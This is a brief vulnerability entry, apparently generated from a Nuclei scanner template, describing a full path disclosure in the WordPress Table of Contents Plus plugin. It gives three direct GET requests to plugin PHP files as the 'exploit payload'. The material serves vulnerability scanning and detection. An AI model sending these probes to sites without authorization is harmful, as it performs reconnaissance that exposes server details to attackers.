# Vulnerability: WordPress Table of Contents Plus - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-table-of-contents-plus-fpd.yaml`)

## Description
WordPress Table of Contents Plus plugin is vulnerable to full path disclosure via direct access to plugin files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/table-of-contents-plus/includes/class.toc.php
GET {{BaseURL}}/wp-content/plugins/table-of-contents-plus/admin/class.admin.php
GET {{BaseURL}}/wp-content/plugins/table-of-contents-plus/front.php
```

